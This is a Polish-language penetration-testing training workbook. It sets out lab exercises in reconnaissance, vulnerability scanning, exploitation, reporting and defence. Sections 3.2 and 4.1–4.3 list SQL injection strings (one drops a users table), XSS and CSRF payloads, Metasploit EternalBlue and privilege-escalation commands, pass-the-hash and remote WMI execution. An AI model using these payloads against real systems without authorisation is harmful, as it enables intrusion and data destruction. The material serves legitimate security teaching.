# Ćwiczenia Praktyczne - Testy Penetracyjne
## Zestaw ćwiczeń dla uczestników szkoleń

---

## Spis treści

1. [Ćwiczenia wprowadzające](#1-ćwiczenia-wprowadzające)
2. [Ćwiczenia z rekonesansu](#2-ćwiczenia-z-rekonesansu)
3. [Ćwiczenia z identyfikacji podatności](#3-ćwiczenia-z-identyfikacji-podatności)
4. [Ćwiczenia z eksploitacji](#4-ćwiczenia-z-eksploitacji)
5. [Ćwiczenia z raportowania](#5-ćwiczenia-z-raportowania)
6. [Ćwiczenia z obrony](#6-ćwiczenia-z-obrony)

---

## 1. Ćwiczenia wprowadzające

### Ćwiczenie 1.1: Identyfikacja typów testów penetracyjnych

**Cel**: Zrozumienie różnych typów testów penetracyjnych i ich zastosowań

**Czas**: 30 minut

**Materiały**: 
- Komputery z dostępem do internetu
- Arkusze z opisami scenariuszy

**Instrukcje**:
1. Uczestnicy otrzymują 5 scenariuszy opisujących różne sytuacje testowe
2. Dla każdego scenariusza określają:
   - Typ testu penetracyjnego (Black Box, White Box, Gray Box)
   - Zakres testów (External, Internal, Web App, Mobile, Social Engineering)
   - Metodologię (OWASP, OSSTMM, PTES)
3. Uzasadniają swoje wybory

**Scenariusze**:
1. Test aplikacji webowej z pełnym dostępem do kodu źródłowego
2. Test zewnętrznej infrastruktury bez wcześniejszej wiedzy o systemie
3. Test wewnętrznej sieci z częściową wiedzą o topologii
4. Test aplikacji mobilnej na urządzeniach testowych
5. Test podatności pracowników na ataki phishingowe

**Oczekiwane rezultaty**:
- Uczestnicy potrafią klasyfikować typy testów
- Rozumieją różnice między metodologiami
- Wiedzą, kiedy zastosować dany typ testu

---

### Ćwiczenie 1.2: Planowanie testów penetracyjnych

**Cel**: Nauka tworzenia skutecznych planów testów

**Czas**: 45 minut

**Materiały**:
- Szablon planu testów
- Przykładowe wymagania klienta

**Instrukcje**:
1. Uczestnicy otrzymują wymagania klienta dotyczące testów
2. Tworzą plan testów zawierający:
   - Zakres i cele testów
   - Metodologię
   - Harmonogram
   - Zasoby wymagane
   - Kryteria sukcesu
   - Plan komunikacji
3. Prezentują plany i omawiają różnice

**Przykładowe wymagania**:
```
Klient: Firma XYZ
System: Aplikacja e-commerce
Wymagania:
- Test zewnętrznej infrastruktury
- Test aplikacji webowej
- Test wewnętrznej sieci
- Czas: 2 tygodnie
- Zespół: 2 osoby
- Raport: W języku polskim
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią tworzyć kompleksowe plany
- Rozumieją znaczenie dokumentacji
- Wiedzą, jak zarządzać zasobami

---

## 2. Ćwiczenia z rekonesansu

### Ćwiczenie 2.1: Pasywny rekonesans z OSINT

**Cel**: Nauka zbierania informacji z otwartych źródeł

**Czas**: 60 minut

**Materiały**:
- Komputery z dostępem do internetu
- Lista narzędzi OSINT
- Przykładowe cele do analizy

**Instrukcje**:
1. Uczestnicy wybierają cel (firma, domena, osoba)
2. Przeprowadzają pasywny rekonesans używając:
   - Google Dorking
   - Social Media Intelligence
   - DNS Enumeration
   - Whois Lookup
   - Shodan
3. Dokumentują znalezione informacje
4. Prezentują wyniki

**Narzędzia do użycia**:
- Google (operatory wyszukiwania)
- theHarvester
- Recon-ng
- Maltego Community
- Shodan
- DNSdumpster

**Oczekiwane rezultaty**:
- Uczestnicy potrafią zbierać informacje z OSINT
- Znają narzędzia do rekonesansu
- Rozumieją znaczenie informacji publicznych

---

### Ćwiczenie 2.2: Aktywny rekonesans z Nmap

**Cel**: Nauka skanowania portów i usług

**Czas**: 45 minut

**Materiały**:
- Komputery z zainstalowanym Nmap
- Testowa sieć (lub maszyny wirtualne)
- Dokumentacja Nmap

**Instrukcje**:
1. Uczestnicy skanują testową sieć używając różnych opcji Nmap
2. Identyfikują otwarte porty i usługi
3. Określają wersje usług i systemy operacyjne
4. Tworzą mapę sieci
5. Analizują wyniki

**Komendy Nmap do przetestowania**:
```bash
# Podstawowe skanowanie
nmap -sS target

# Skanowanie z wykrywaniem usług
nmap -sV target

# Skanowanie z wykrywaniem OS
nmap -O target

# Skanowanie z skryptami
nmap -sC target

# Skanowanie wszystkich portów
nmap -p- target
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią używać Nmap
- Znają różne typy skanowania
- Potrafią interpretować wyniki

---

### Ćwiczenie 2.3: Enumeracja DNS

**Cel**: Nauka zbierania informacji o domenach

**Czas**: 30 minut

**Materiały**:
- Komputery z dostępem do internetu
- Narzędzia do enumeracji DNS
- Przykładowe domeny

**Instrukcje**:
1. Uczestnicy wybierają domenę do analizy
2. Przeprowadzają enumerację DNS używając:
   - nslookup
   - dig
   - host
   - dnsrecon
   - fierce
3. Zbierają informacje o:
   - Rekordach A, AAAA, MX, NS, TXT
   - Subdomenach
   - Transferach stref
4. Dokumentują wyniki

**Narzędzia do użycia**:
```bash
# Podstawowe zapytania DNS
nslookup domain.com
dig domain.com
host domain.com

# Enumeracja subdomen
dnsrecon -d domain.com
fierce -dns domain.com

# Transfer strefy
dig @ns1.domain.com domain.com AXFR
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią enumerować DNS
- Znają typy rekordów DNS
- Rozumieją znaczenie informacji DNS

---

## 3. Ćwiczenia z identyfikacji podatności

### Ćwiczenie 3.1: Skanowanie luk bezpieczeństwa

**Cel**: Nauka używania skanerów luk bezpieczeństwa

**Czas**: 60 minut

**Materiały**:
- Komputery z zainstalowanymi skanerami
- Testowa sieć z podatnościami
- Dokumentacja narzędzi

**Instrukcje**:
1. Uczestnicy skanują testową sieć używając:
   - Nessus
   - OpenVAS
   - Nikto
   - OWASP ZAP
2. Analizują znalezione luki
3. Kategoryzują podatności według:
   - Krytyczności
   - Typu
   - Wpływu
4. Tworzą raport z podatnościami

**Narzędzia do użycia**:
```bash
# Skanowanie z Nikto
nikto -h target

# Skanowanie z OWASP ZAP
zap.sh -cmd -quickurl target

# Skanowanie z OpenVAS
openvas-cli --create-target --name "Test" --host target
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią używać skanerów
- Znają różne typy podatności
- Potrafią oceniać krytyczność luk

---

### Ćwiczenie 3.2: Testowanie aplikacji webowych

**Cel**: Nauka testowania bezpieczeństwa aplikacji webowych

**Czas**: 90 minut

**Materiały**:
- Komputery z zainstalowanym Burp Suite
- Testowa aplikacja webowa (np. DVWA, WebGoat)
- Lista testów do wykonania

**Instrukcje**:
1. Uczestnicy testują aplikację webową używając Burp Suite
2. Wykonują testy z OWASP Top 10:
   - SQL Injection
   - Cross-Site Scripting (XSS)
   - Cross-Site Request Forgery (CSRF)
   - Broken Authentication
   - Security Misconfiguration
3. Dokumentują znalezione luki
4. Tworzą proof of concept

**Testy do wykonania**:
```sql
-- SQL Injection
' OR '1'='1
' UNION SELECT 1,2,3--
'; DROP TABLE users--

-- XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

-- CSRF
<form action="http://target/delete" method="POST">
<input type="hidden" name="id" value="1">
<input type="submit" value="Delete">
</form>
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią testować aplikacje webowe
- Znają techniki ataków webowych
- Potrafią tworzyć proof of concept

---

### Ćwiczenie 3.3: Analiza konfiguracji bezpieczeństwa

**Cel**: Nauka identyfikacji błędów konfiguracji

**Czas**: 45 minut

**Materiały**:
- Komputery z dostępem do testowych systemów
- Lista kontrolna konfiguracji
- Narzędzia do analizy

**Instrukcje**:
1. Uczestnicy analizują konfigurację testowych systemów
2. Sprawdzają:
   - Ustawienia firewall
   - Konfigurację usług
   - Uprawnienia użytkowników
   - Ustawienia bezpieczeństwa
3. Identyfikują błędy konfiguracji
4. Proponują poprawki

**Lista kontrolna**:
- [ ] Firewall skonfigurowany poprawnie
- [ ] Niepotrzebne usługi wyłączone
- [ ] Użytkownicy mają minimalne uprawnienia
- [ ] Logi są włączone
- [ ] Aktualizacje bezpieczeństwa zainstalowane
- [ ] Silne hasła wymagane
- [ ] Szyfrowanie włączone

**Oczekiwane rezultaty**:
- Uczestnicy potrafią analizować konfigurację
- Znają dobre praktyki konfiguracji
- Potrafią identyfikować błędy

---

## 4. Ćwiczenia z eksploitacji

### Ćwiczenie 4.1: Wykorzystanie luk z Metasploit

**Cel**: Nauka używania Metasploit do eksploitacji

**Czas**: 90 minut

**Materiały**:
- Komputery z zainstalowanym Metasploit
- Testowa sieć z podatnościami
- Dokumentacja Metasploit

**Instrukcje**:
1. Uczestnicy identyfikują podatności w testowej sieci
2. Używają Metasploit do eksploitacji:
   - Wyszukują odpowiednie exploit
   - Konfigurują payload
   - Wykonują atak
   - Uzyskują dostęp do systemu
3. Dokumentują proces eksploitacji

**Przykładowe exploity**:
```bash
# Uruchomienie Metasploit
msfconsole

# Wyszukiwanie exploitów
search ms17-010

# Użycie exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
exploit
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią używać Metasploit
- Znają proces eksploitacji
- Rozumieją znaczenie payload

---

### Ćwiczenie 4.2: Eskalacja uprawnień

**Cel**: Nauka technik eskalacji uprawnień

**Czas**: 60 minut

**Materiały**:
- Komputery z dostępem do testowych systemów
- Narzędzia do eskalacji uprawnień
- Dokumentacja technik

**Instrukcje**:
1. Uczestnicy uzyskują dostęp do systemu z ograniczonymi uprawnieniami
2. Próbują eskalować uprawnienia używając:
   - Exploitów kernel
   - Błędów konfiguracji
   - Słabych haseł
   - Token theft
3. Dokumentują proces eskalacji

**Techniki eskalacji**:
```bash
# Sprawdzenie uprawnień
whoami /priv

# Wyszukiwanie exploitów
searchsploit privilege escalation

# Użycie exploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

**Oczekiwane rezultaty**:
- Uczestnicy znają techniki eskalacji
- Potrafią identyfikować możliwości eskalacji
- Rozumieją znaczenie uprawnień

---

### Ćwiczenie 4.3: Ruch boczny w sieci

**Cel**: Nauka technik ruchu bocznego

**Czas**: 75 minut

**Materiały**:
- Komputery z dostępem do testowej sieci
- Narzędzia do ruchu bocznego
- Dokumentacja technik

**Instrukcje**:
1. Uczestnicy uzyskują dostęp do jednego systemu w sieci
2. Próbują rozszerzyć dostęp na inne systemy używając:
   - Pass-the-hash
   - Pass-the-ticket
   - WMI
   - PowerShell
   - RDP
3. Tworzą mapę dostępnych systemów
4. Dokumentują proces ruchu bocznego

**Techniki ruchu bocznego**:
```bash
# Pass-the-hash
pth-winexe -U domain/user%aad3b435b51404eeaad3b435b51404ee:hash //target cmd

# WMI
wmic /node:target process call create "cmd.exe /c whoami"

# PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName target
```

**Oczekiwane rezultaty**:
- Uczestnicy znają techniki ruchu bocznego
- Potrafią mapować sieć
- Rozumieją znaczenie ruchu bocznego

---

## 5. Ćwiczenia z raportowania

### Ćwiczenie 5.1: Tworzenie raportu z testów

**Cel**: Nauka tworzenia skutecznych raportów

**Czas**: 60 minut

**Materiały**:
- Szablon raportu
- Przykładowe wyniki testów
- Komputery z edytorem tekstu

**Instrukcje**:
1. Uczestnicy otrzymują wyniki testów penetracyjnych
2. Tworzą raport zawierający:
   - Executive Summary
   - Metodologię
   - Odkryte luki
   - Ocena ryzyka
   - Rekomendacje
   - Plan naprawczy
3. Prezentują raporty i omawiają różnice

**Szablon raportu**:
```markdown
# Raport z testów penetracyjnych

## Executive Summary
- Cel testów
- Zakres testów
- Główne odkrycia
- Poziom ryzyka

## Metodologia
- Standard użyty
- Narzędzia
- Fazy testów

## Odkryte luki
### Luka 1: [Nazwa]
- Opis
- Krytyczność
- Dowód koncepcji
- Rekomendacje

## Ocena ryzyka
- Macierz ryzyka
- Priorytety naprawy

## Plan naprawczy
- Harmonogram
- Odpowiedzialni
- Koszty
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią tworzyć raporty
- Znają strukturę raportu
- Potrafią oceniać ryzyko

---

### Ćwiczenie 5.2: Prezentacja wyników

**Cel**: Nauka prezentowania wyników testów

**Czas**: 45 minut

**Materiały**:
- Prezentacje uczestników
- Projektor
- Komputery z PowerPoint/Prezi

**Instrukcje**:
1. Uczestnicy przygotowują prezentację wyników testów
2. Prezentują wyniki w formie:
   - Executive Summary (5 min)
   - Główne odkrycia (10 min)
   - Rekomendacje (5 min)
   - Pytania i odpowiedzi (5 min)
3. Oceniają prezentacje innych uczestników

**Kryteria oceny**:
- [ ] Jasność przekazu
- [ ] Struktura prezentacji
- [ ] Jakość slajdów
- [ ] Odpowiedzi na pytania
- [ ] Czas prezentacji

**Oczekiwane rezultaty**:
- Uczestnicy potrafią prezentować wyniki
- Znają techniki prezentacji
- Potrafią odpowiadać na pytania

---

## 6. Ćwiczenia z obrony

### Ćwiczenie 6.1: Konfiguracja honeypotów

**Cel**: Nauka implementacji honeypotów

**Czas**: 90 minut

**Materiały**:
- Komputery z zainstalowanymi honeypotami
- Testowa sieć
- Dokumentacja narzędzi

**Instrukcje**:
1. Uczestnicy instalują i konfigurują honeypoty:
   - Kippo (SSH honeypot)
   - Dionaea (malware honeypot)
   - Cowrie (SSH/Telnet honeypot)
2. Konfigurują logowanie i monitoring
3. Testują działanie honeypotów
4. Analizują logi ataków

**Instalacja honeypotów**:
```bash
# Instalacja Kippo
git clone https://github.com/desaster/kippo.git
cd kippo
python setup.py install

# Konfiguracja
cp kippo.cfg.dist kippo.cfg
# Edytuj konfigurację

# Uruchomienie
python kippo.py
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią konfigurować honeypoty
- Znają różne typy honeypotów
- Potrafią analizować logi

---

### Ćwiczenie 6.2: Konfiguracja IDS/IPS

**Cel**: Nauka implementacji systemów IDS/IPS

**Czas**: 75 minut

**Materiały**:
- Komputery z zainstalowanym Snort
- Testowa sieć
- Dokumentacja Snort

**Instrukcje**:
1. Uczestnicy instalują i konfigurują Snort
2. Tworzą reguły detekcji
3. Testują działanie systemu
4. Analizują alerty

**Konfiguracja Snort**:
```bash
# Instalacja Snort
sudo apt-get install snort

# Konfiguracja
sudo nano /etc/snort/snort.conf

# Uruchomienie
sudo snort -i eth0 -c /etc/snort/snort.conf

# Tworzenie reguł
echo 'alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001;)' >> /etc/snort/rules/local.rules
```

**Oczekiwane rezultaty**:
- Uczestnicy potrafią konfigurować IDS/IPS
- Znają składnię reguł
- Potrafią analizować alerty

---

### Ćwiczenie 6.3: Hardening systemów

**Cel**: Nauka wzmacniania zabezpieczeń systemów

**Czas**: 60 minut

**Materiały**:
- Komputery z testowymi systemami
- Lista kontrolna hardeningu
- Narzędzia do hardeningu

**Instrukcje**:
1. Uczestnicy analizują testowe systemy
2. Wykonują hardening używając:
   - CIS-CAT
   - Lynis
   - Ansible
   - Ręczne konfiguracje
3. Testują skuteczność hardeningu
4. Dokumentują zmiany

**Lista kontrolna hardeningu**:
- [ ] Usunięcie niepotrzebnych usług
- [ ] Konfiguracja firewall
- [ ] Aktualizacje bezpieczeństwa
- [ ] Konfiguracja logów
- [ ] Silne hasła
- [ ] Szyfrowanie
- [ ] Kontrola dostępu

**Oczekiwane rezultaty**:
- Uczestnicy potrafią wykonywać hardening
- Znają dobre praktyki
- Potrafią testować skuteczność

---

## Podsumowanie ćwiczeń

### Kluczowe umiejętności do opanowania:

1. **Planowanie testów** - tworzenie skutecznych planów
2. **Rekonesans** - zbieranie informacji z różnych źródeł
3. **Identyfikacja podatności** - znajdowanie luk bezpieczeństwa
4. **Eksploitacja** - wykorzystanie znalezionych luk
5. **Raportowanie** - tworzenie skutecznych raportów
6. **Obrona** - implementacja mechanizmów ochrony

### Wskazówki dla trenerów:

1. **Przygotuj środowisko** - upewnij się, że wszystkie narzędzia są zainstalowane
2. **Monitoruj postęp** - sprawdzaj, czy uczestnicy wykonują ćwiczenia poprawnie
3. **Zachęcaj do pytań** - odpowiadaj na pytania i wyjaśniaj wątpliwości
4. **Omawiaj wyniki** - po każdym ćwiczeniu omów wyniki z całą grupą
5. **Dostosowuj tempo** - dostosowuj tempo do poziomu uczestników

### Materiały dodatkowe:

- Dokumentacja narzędzi
- Listy kontrolne
- Szablony raportów
- Przykładowe konfiguracje
- Linki do zasobów online

---

*Te ćwiczenia stanowią praktyczną część szkolenia z testów penetracyjnych i powinny być wykonywane pod nadzorem doświadczonego trenera.*